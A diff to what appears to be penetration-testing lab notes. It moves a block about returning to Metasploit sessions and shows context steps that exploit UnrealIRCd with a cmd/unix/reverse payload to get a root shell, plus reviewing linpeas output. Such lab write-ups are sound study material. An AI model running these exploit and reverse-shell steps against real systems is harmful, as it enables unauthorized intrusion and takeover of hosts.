@@ -103,6 +103,13 @@ From kali terminal:
 less -r out.txt # Open linpeas file
 ```
 
+Go back to the session:
+```bash
+sessions -i* # list sessions
+sessions -i 1 # go back to the first session
+```
+
+
 From msfconsole:
 ```bash
 search unrealirc
@@ -113,10 +120,4 @@ set payload cmd/unix/reverse
 exploit
 # this creates a shell
 whoami # root
-```
-
-Go back to the session:
-```bash
-sessions -i* # list sessions
-sessions -i 1 # go back to the first session
 ```
